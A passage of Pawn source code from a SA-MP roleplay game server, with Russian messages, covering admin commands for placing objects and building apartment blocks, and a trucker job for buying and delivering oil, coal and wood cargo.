	if(SlotObject[params[0]] != 0) return SCM(playerid, -1, " Объект установлен"), printf("Администратор %s установил объект [ID: %i]", Name(playerid), params[1]);
	else SCM(playerid, COLOR_GREY, " Произошла ошибка при создании объекта");
	return 1;
}
CMD:attach(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6) return true;
	new objectid, vehicleid, Float:x1, Float:y1, Float:z1, Float:rX, Float:rY, Float:rZ;
	if(sscanf(params, "dddffffff", params[0], objectid, vehicleid, x1, y1, z1, rX, rY, rZ)) return SCM(playerid, -1, " Введите: /attach [слот] [ид объекта] [ид автомобиля] [X] [Y] [Z] [rX] [rY] [rZ]");
	if(SlotAttach[params[0]] != 0) return SCM(playerid, COLOR_GREY, " Слот занят!");
	SlotAttach[params[0]] = CreateObject(objectid, 0.0, 0.0, 10.0, 0.0, 0.0, 0.0);
	AttachObjectToVehicle(SlotAttach[params[0]], vehicleid, x1, y1, z1, rX, rY, rZ);
	SCM(playerid, -1, " Объект установлен");
	printf("Администратор %s прикрепил объект %i к автомобилю %i на слот %i", Name(playerid), objectid, vehicleid, params[0]);
	return 1;
}
CMD:delattach(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /delAttach [слот]");
	if(SlotAttach[params[0]] != 0)
	{
		DestroyObject(SlotAttach[params[0]]);
		SlotAttach[params[0]] = 0;
	}
	printf("Администратор %s удалил объект прикреплённый к автомобилю slot%i", Name(playerid), params[0]);
	return 1;
}
CMD:object(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	new Float:x1,Float:y1,Float:z1, Float:rX, Float:rY, Float: rZ;
	if(sscanf(params, "ddffffff", params[0],params[1], x1, y1, z1, rX, rY, rZ)) return SCM(playerid, -1, " Введите: /object [слот] [id объекта] [X] [Y] [Z] [rX] [rY] [rZ]");
	if(SlotObject[params[0]] != 0) return 1;
	SlotObject[params[0]] = CreateDynamicObject(params[1],x1, y1, z1, rX, rY, rZ);
	if(SlotObject[params[0]] != 0) return SCM(playerid, -1, " Объект установлен");
	else SCM(playerid, COLOR_GREY, " Произошла ошибка при создании объекта");
	printf("Администратор %s установил объект %i", Name(playerid), params[1]);
	return 1;
}
CMD:dobject(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /dobject [слот]");
	if(SlotObject[params[0]] != 0)
	{
		DestroyDynamicObject(SlotObject[params[0]]);
		SlotObject[params[0]] = 0;
	}
	printf("Администратор %s удалил объект слот%i", Name(playerid), params[0]);
	return 1;
}
CMD:eobject(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return 1;
	if(sscanf(params, "d", params[0])) { SelectObject(playerid); } else
	{
		if(SlotObject[params[0]] != 0)
		{
			EditDynamicObject(playerid,SlotObject[params[0]]);
		}
	}
	return 1;
}
CMD:podeezd(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0]))return SCM(playerid, -1, " Введите: /podeezd [1-9] [int: 0-1] | 0-bomj podeezd , 1-elite podeezd");
	else if(sscanf(params, "d", params[1]))return SCM(playerid, -1, " Введите: /podeezd [1-9] [int: 0-1] | 0-bomj podeezd , 1-elite podeezd");
	new Float:X,Float:Y,Float:Z;
	if(global[playerid] == 0)
	{
		if(params[0] > 9 || params[0] < 1) return SCM(playerid, -1, "Неверное кол-во этажей");
		mysql_format(DATABASE,QUERY, 128, "INSERT INTO `podezd` (`podEtazi`) VALUES ('%i')",params[0]);
		mysql_function_query(DATABASE,QUERY,false,"","");
		AllPODEZD ++;
		GetPlayerPos(playerid, X,Y,Z);
		new carid = CreateVehicle(560, X,Y,Z, 0.0, 230, 230, 60000);
		PutPlayerInVehicleEx(playerid, carid, 0), Fuell[carid] = 200;
		SetPlayerArmedWeapon(playerid,0);
		PodeezdInfo[AllPODEZD][podEtazi] = params[0];
		PodeezdInfo[AllPODEZD][podInt] = params[1];
		PodeezdInfo[AllPODEZD][pid] = AllPODEZD;
		global[playerid] = 1;
		printf("Администратор %s начал создание подьезда %i", Name(playerid), AllPODEZD);
		SCM(playerid, -1, " Поставьте автомобиль туда, где будет находиться парковочное место и введите /podcrt");
		return true;
	}
	return true;
}
publics: AddKvartira(Float:x,Float:y,Float:z,interior,world,virtmirs)
{
	new price = 0;
	switch(interior)
	{
	    case 1: price = 300000;
	    case 15: price = 100000;
	    default: return false;
	}
	mysql_format(DATABASE, QUERY, 128, "INSERT INTO `kvart` (`pXpic`) VALUES ('%f')",x);
	mysql_function_query(DATABASE,QUERY,false,"","");
	ALLKVARTIRI ++;
	kvartinfo[ALLKVARTIRI][pXpic] = x;
	kvartinfo[ALLKVARTIRI][kid] = ALLKVARTIRI;
	kvartinfo[ALLKVARTIRI][pYpic] = y;
	kvartinfo[ALLKVARTIRI][pZpic] = z;
	strmid(kvartinfo[ALLKVARTIRI][vladelec], "None", 0, 5, 5);
	kvartinfo[ALLKVARTIRI][lock] = 0;
	kvartinfo[ALLKVARTIRI][kworld] = world;
	kvartinfo[ALLKVARTIRI][virtmir] = virtmirs;
	kvartinfo[ALLKVARTIRI][kCena] = price;
	kvartinfo[ALLKVARTIRI][kInt] = 0;
	format(YCMDstr, 200,"{0076FC}Комната #%i\nПродается: %i вирт\nЧтобы войти, нажмите клавишу 'ENTER'",ALLKVARTIRI,kvartinfo[ALLKVARTIRI][kCena]);
	kvartinfo[ALLKVARTIRI][dtext] = CreateDynamic3DTextLabel(YCMDstr,0x0076FCFF,x,y,z+1,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,world);
	updatekvar(ALLKVARTIRI);
	return true;
}
CMD:addkvarts(playerid)
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(GetPVarInt(playerid, "podeezd") <= 0) return SCM(playerid,COLOR_GREY," Создать квартиру можно только в подъезде");
	new inter = GetPlayerInterior(playerid), vw = GetPlayerVirtualWorld(playerid), podeezd = GetPVarInt(playerid, "podeezd");
	for(new i = 1; i <= ALLKVARTIRI; i++)
	{
		if(kvartinfo[ALLKVARTIRI][virtmir] == podeezd
		&& kvartinfo[ALLKVARTIRI][kworld] == vw)
		return SCM(playerid, COLOR_GREY, " На этом этаже уже есть квартиры");
	}
	if(inter == 1) // Expensive
	{
		AddKvartira(2269.7959,1667.8560,1084.2469,inter,vw, podeezd);
		AddKvartira(2271.3367,1662.5071,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0420,1662.5962,1084.2344,inter,vw, podeezd);
		AddKvartira(2271.3372,1652.5176,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0432,1652.5735,1084.2344,inter,vw, podeezd);
		AddKvartira(2271.3369,1642.1674,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0454,1642.1913,1084.2344,inter,vw, podeezd);
		AddKvartira(2271.3374,1633.4883,1084.2344,inter,vw, podeezd);
		AddKvartira(2266.0454,1633.4976,1084.2344,inter,vw, podeezd);
		AddKvartira(2269.8108,1627.5787,1084.2469,inter,vw, podeezd);
		printf("Администратор %s добавил квартиры на %i этаж подьезда %i", Name(playerid), vw, podeezd);
	}
	else if(inter == 15) // Cheap
	{
		AddKvartira(2201.0576,-1188.5807,1029.7969,inter,vw, podeezd);
	    AddKvartira(2209.5254,-1187.3658,1029.7969,inter,vw, podeezd);
	    AddKvartira(2209.6096,-1189.9896,1029.7969,inter,vw, podeezd);
	    AddKvartira(2225.5920,-1187.2491,1029.7969,inter,vw, podeezd);
	    AddKvartira(2225.6433,-1189.9564,1029.7969,inter,vw, podeezd);
	    AddKvartira(2239.8442,-1170.6464,1029.7969,inter,vw, podeezd);
	    AddKvartira(2242.5247,-1170.6975,1029.7969,inter,vw, podeezd);
	    AddKvartira(2239.8364,-1159.7601,1029.7969,inter,vw, podeezd);
	    AddKvartira(2242.6294,-1159.6667,1029.7969,inter,vw, podeezd);
	    AddKvartira(2229.3750,-1150.5298,1029.7969,inter,vw, podeezd);
	    printf("Администратор %s добавил квартиры на %i этаж подьезда %i", Name(playerid), vw, podeezd);
	}
	else SCM(playerid, COLOR_GREY, " Вы должны находиться в подьезде!");
 	return true;
}
CMD:kvartira(playerid, params[])
{
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0]))return SCM(playerid, -1, " Введите: /kvartira [цена]");
	if(GetPVarInt(playerid, "podeezd") <= 0) return SCM(playerid,COLOR_GREY," Создать квартиру можно только в подъезде");
	new heh = GetPlayerInterior(playerid);
	AddKvartira(x,y,z,heh,GetPlayerVirtualWorld(playerid), GetPVarInt(playerid, "podeezd"));
	printf("Администратор %s добавил квартиру %i на %i этаж подьезда %i", Name(playerid), ALLKVARTIRI, GetPlayerVirtualWorld(playerid), GetPVarInt(playerid, "podeezd"));
	return true;
}
CMD:podcrt(playerid, params[])
{
	new Float:X,Float:Y,Float:Z,Float:Angle;
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(global[playerid] == 1)
	{
		GetVehiclePos(GetPlayerVehicleID(playerid), X,Y,Z);
		GetVehicleZAngle(GetPlayerVehicleID(playerid), Angle);
		DestroyVehicle(GetPlayerVehicleID(playerid));
		PodeezdInfo[AllPODEZD][carX]        =    X;
		PodeezdInfo[AllPODEZD][carY]        =    Y;
		PodeezdInfo[AllPODEZD][carZ]       =   Z;
		PodeezdInfo[AllPODEZD][carC]       =   Angle;
		global[playerid] = 2;
		printf("Администратор %s установил координаты автомобильной парковки подьезда %i", Name(playerid),AllPODEZD);
		SCM(playerid,-1," Встаньте к месту входа подъезда и введите /podcreate");
		return true;
	}
	return true;
}
CMD:podcreate(playerid, params[])
{
	new Float:X,Float:Y,Float:Z;
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(global[playerid] == 2)
	{
		global[playerid] = 0;
		GetPlayerPos(playerid, X,Y,Z);
		PodeezdInfo[AllPODEZD][podPicX]        =    X;
		PodeezdInfo[AllPODEZD][podPicY]        =    Y;
		PodeezdInfo[AllPODEZD][podPicZ]        =    Z;
		PodeezdInfo[AllPODEZD][podPic]            =    CreatePickupAC(1318, 1, X, Y, Z);
		for(new b = 1; b <= PodeezdInfo[AllPODEZD][podEtazi]; b++)
		{
			ALLPODEZD++;
			PodeezdInfo[AllPODEZD][podMir][b]   =   ALLPODEZD;
		}
		format(YCMDstr, 123,"Многоквартирный дом\nНомер подъезда: %i",AllPODEZD);
		printf("Администратор %s полностью создал подьезд %i", Name(playerid), ALLPODEZD);
		CreateDynamic3DTextLabel(YCMDstr,0x0076FCFF,PodeezdInfo[AllPODEZD][podPicX],PodeezdInfo[AllPODEZD][podPicY],PodeezdInfo[AllPODEZD][podPicZ]+1,5.0);
		return SCM(playerid, -1, " Вы успешно создали подъезд!");
	}
	return true;
}
CMD:tload(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	new maxguz = PlayerInfo[playerid][pDMgruz];
	if(!IsPlayerConnected(playerid)) return true;
	if(Gruz[playerid] != 0) return true;
	if(GetVehicleTrailer(GetPlayerVehicleID(playerid))) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /tload [количество]");
	if(params[0] < 1) return SCM(playerid, COLOR_GREY, " Неверное значение");
	if(IsPlayerInRangeOfPoint(playerid, 10.0, 256.4736,1414.5182,10.7075))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PlayerInfo[playerid][pCash] < params[0]*Benzbuy[0]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PlayerInfo[playerid][pCash] -= params[0]*Benzbuy[0];
		PlayerInfo[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Benzbuy[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(584, 249.1628,1420.7445,11.1698,269.4982,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 1;
		bGruz[playerid] = 1;
		if(Benzbuy[0] != 900) Benzbuy[0] += 100;
		Benzbuy[1] -= 100;
		if(Benzbuy[0] == 900) {
			Benzbuy[1] = 200; }
		format(string, sizeof(string), "Нефтезавод №1\nЦена за тонну: %d",Benzbuy[0]);
		Update3DTextLabelText(GasZavod[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Нефтезавод №2\nЦена за тонну: %d",Benzbuy[1]);
		Update3DTextLabelText(GasZavod[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-1046.7723,-670.7208,32.3516))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PlayerInfo[playerid][pCash] < params[0]*Benzbuy[1]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PlayerInfo[playerid][pCash] -= params[0]*Benzbuy[1];
		PlayerInfo[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Benzbuy[1]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(584,-1053.0789,-662.7253,32.5968,266.1711,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 1;
		bGruz[playerid] = 1;
		Benzbuy[0] -= 100;
		if(Benzbuy[1] != 900) Benzbuy[1] += 100;
		if(Benzbuy[1] == 900) {
			Benzbuy[0] = 200; }
		format(string, sizeof(string), "Нефтезавод №1\nЦена за тонну: %d",Benzbuy[0]);
		Update3DTextLabelText(GasZavod[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Нефтезавод №2\nЦена за тонну: %d",Benzbuy[1]);
		Update3DTextLabelText(GasZavod[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,608.7718,847.8765,-43.1532))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PlayerInfo[playerid][pCash] < params[0]*ugolbuy[0]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PlayerInfo[playerid][pCash] -= params[0]*ugolbuy[0];
		PlayerInfo[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],ugolbuy[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(450,588.2112,844.9619,-42.8014,272.4998,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 2;
		bGruz[playerid] = 2;
		if(ugolbuy[0] != 900) ugolbuy[0] += 100;
		ugolbuy[1] -= 100;
		if(ugolbuy[0] == 900) {
			ugolbuy[1] = 200; }
		format(string, sizeof(string), "Cклад угля №1\nЦена за тонну: %d",ugolbuy[0]);
		Update3DTextLabelText(Sklad[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Cклад угля №2\nЦена за тонну: %d",ugolbuy[1]);
		Update3DTextLabelText(Sklad[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-1873.0896,-1720.2430,21.7500))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PlayerInfo[playerid][pCash] < params[0]*ugolbuy[1]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PlayerInfo[playerid][pCash] -= params[0]*ugolbuy[1];
		PlayerInfo[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],ugolbuy[1]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(450,-1881.3596,-1689.1852,22.3543,172.1823,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 2;
		bGruz[playerid] = 2;
		ugolbuy[0] -= 100;
		if(ugolbuy[1] != 900) ugolbuy[1] += 100;
		if(ugolbuy[1] == 900) {
			ugolbuy[0] = 200; }
		format(string, sizeof(string), "Cклад угля №1\nЦена за тонну: %d",ugolbuy[0]);
		Update3DTextLabelText(Sklad[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Cклад угля №2\nЦена за тонну: %d",ugolbuy[1]);
		Update3DTextLabelText(Sklad[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-449.3336,-65.9115,59.4158))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PlayerInfo[playerid][pCash] < params[0]*Buyderevo[0]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PlayerInfo[playerid][pCash] -= params[0]*Buyderevo[0];
		PlayerInfo[playerid][pDgruz] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Buyderevo[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		CreateVehicle(450,-455.8806,-47.2069,60.4907,182.1683,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 3;
		bGruz[playerid] = 3;
		if(Buyderevo[0] != 900) Buyderevo[0] += 100;
		Buyderevo[1] -= 100;
		if(Buyderevo[0] == 900) {
			Buyderevo[1] = 200; }
		format(string, sizeof(string), "Лесопилка №1\nЦена за тонну: %d",Buyderevo[0]);
		Update3DTextLabelText(Derevobuy[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Лесопилка №2\n Цена за тонну: %d",Buyderevo[1]);
		Update3DTextLabelText(Derevobuy[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0,-1978.6846,-2434.8274,30.6250))
	{
		if(togran[playerid] > gettime()) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, нужно подготовить груз");
		if(params[0] > maxguz)
		{
			format(YCMDstr, sizeof(YCMDstr), " Слишком много товара,ваш максимум: %i т.",maxguz);
			SCM(playerid,COLOR_GREY,YCMDstr);
			return true;
		}
		if(PlayerInfo[playerid][pCash] < params[0]*Buyderevo[1]) return SCM(playerid, 0x6495EDFF, " У вас нет столько денег!");
		PlayerInfo[playerid][pCash] -= params[0]*Buyderevo[1];
		format(YCMDstr, sizeof(YCMDstr), " Загружено %i груза, на сумму %i вирт", params[0],Buyderevo[0]*params[0]);
		SCM(playerid, 0x50fe96aa, YCMDstr);
		PlayerInfo[playerid][pDgruz] += params[0];
		CreateVehicle(450,-1966.3121,-2436.0132,31.2080,226.3676,1,1, -1);
		DriverJob[playerid] = true;
		Gruz[playerid] = 3;
		bGruz[playerid] = 3;
		Buyderevo[0] -= 100;
		if(Buyderevo[1] != 900) Buyderevo[1] += 100;
		if(Buyderevo[1] == 900) {
			Buyderevo[0] = 200; }
		format(string, sizeof(string), "Лесопилка №1\nЦена за тонну: %d",Buyderevo[0]);
		Update3DTextLabelText(Derevobuy[0],0xFFFF00FF,string);
		format(string, sizeof(string), "Лесопилка №2\n Цена за тонну: %d",Buyderevo[1]);
		Update3DTextLabelText(Derevobuy[1],0xFFFF00FF,string);
		togran[playerid] = gettime()+180;
		return true;
	}
	else
	{
		SCM(playerid, COLOR_GREY, " Вы не на месте закупки!");
	}
	return true;
}
CMD:tunload(playerid, params[])
{
	peremennn[playerid] = 0;
	if(PlayerInfo[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	if(DriverJob[playerid] == false) return SCM(playerid,COLOR_GREY," Вы не загружены");
	if(!IsAtTTPlace(playerid)) return SCM(playerid,0x81DA99AA," Нужно находится в порту");
	switch(bGruz[playerid])
	{
	case 1:
		{
			if(IsPlayerInRangeOfPoint(playerid, 10.0, 2601.7222,-2226.5867,13.3732))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY," Извините, мы вас немного задержим, в порту нет места");
				PlayerInfo[playerid][pCash] += PlayerInfo[playerid][pDgruz]*Sellbenz[0];
				if(booston == 0) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*200;
				else if(booston == 1) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PlayerInfo[playerid][pDgruz],Sellbenz[0]*PlayerInfo[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellbenz[0] != 200) Sellbenz[0] -= 100;
				if(Sellbenz[1] != 900) Sellbenz[1] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 10.0, -1731.4509,118.9413,3.5547))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PlayerInfo[playerid][pCash] += PlayerInfo[playerid][pDgruz]*Sellbenz[1];
				if(booston == 0) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*200;
				else if(booston == 1) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PlayerInfo[playerid][pDgruz],Sellbenz[1]*PlayerInfo[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellbenz[1] != 200) Sellbenz[1] -= 100;
				if(Sellbenz[0] != 900) Sellbenz[0] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
		}
	case 2:
		{
			if(IsPlayerInRangeOfPoint(playerid, 7.0, 2601.7222,-2226.5867,13.3732))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PlayerInfo[playerid][pCash] += PlayerInfo[playerid][pDgruz]*Sellugol[0];
				if(booston == 0) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*200;
				else if(booston == 1) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PlayerInfo[playerid][pDgruz],Sellugol[0]*PlayerInfo[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellugol[0] != 200) Sellugol[0] -= 100;
				if(Sellugol[1] != 900) Sellugol[1] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 7.0, -1731.4509,118.9413,3.5547))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PlayerInfo[playerid][pCash] += PlayerInfo[playerid][pDgruz]*Sellugol[1];
				if(booston == 0) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*200;
				else if(booston == 1) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PlayerInfo[playerid][pDgruz],Sellugol[1]*PlayerInfo[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellugol[1] != 200) Sellugol[1] -= 100;
				if(Sellugol[0] != 900) Sellugol[0] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				Update3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				Update3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
		}
	case 3:
		{
			if(IsPlayerInRangeOfPoint(playerid, 7.0, 2601.7222,-2226.5867,13.3732))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid,COLOR_GREY,"Извините, мы вас немного задержим, в порту нет места");
				PlayerInfo[playerid][pCash] += PlayerInfo[playerid][pDgruz]*Sellderevo[0];
				if(booston == 0) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*200;
				else if(booston == 1) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PlayerInfo[playerid][pDgruz],Sellderevo[0]*PlayerInfo[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellderevo[0] != 200) Sellderevo[0] -= 100;
				if(Sellderevo[1] != 900) Sellderevo[1] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				UpdateDynamic3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				UpdateDynamic3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 7.0, -1731.4509,118.9413,3.5547))
			{
				if(togran[playerid] > gettime()+1) return SCM(playerid, COLOR_GREY, " Извините, мы вас немного задержим, в порту нет места");
				PlayerInfo[playerid][pCash] += PlayerInfo[playerid][pDgruz]*Sellderevo[1];
				if(booston == 0) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*200;
				else if(booston == 1) PlayerInfo[playerid][pDExp] += 400+PlayerInfo[playerid][pDgruz]*600;
				format(YCMDstr, sizeof(YCMDstr), " {00D26D}Вы доставили %d т.груза на сумму %i вирт",PlayerInfo[playerid][pDgruz],Sellderevo[1]*PlayerInfo[playerid][pDgruz]);
				SCM(playerid, 0x66FBA6FF, YCMDstr);
				if(Sellderevo[1] != 200) Sellderevo[1] -= 100;
				if(Sellderevo[0] != 900) Sellderevo[0] += 100;
				format(string, sizeof(string), "Порт ЛС\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[0],Sellugol[0],Sellderevo[0]);
				UpdateDynamic3DTextLabelText(Doki[0],0xFFFF00FF,string);
				format(string, sizeof(string), "Порт СФ\nНефть: %d\nУголь: %d\nДерево: %d",Sellbenz[1],Sellugol[1],Sellderevo[1]);
				UpdateDynamic3DTextLabelText(Doki[1],0xFFFF00FF,string);
				togran[playerid] = gettime()+180;
			}
		}
	}
	peremennn[playerid] = 0;
	bGruz[playerid] = 0;
	DestroyVehicle(GetVehicleTrailer(GetPlayerVehicleID(playerid)));
	Expirence(playerid);
	DriverJob[playerid] = false;
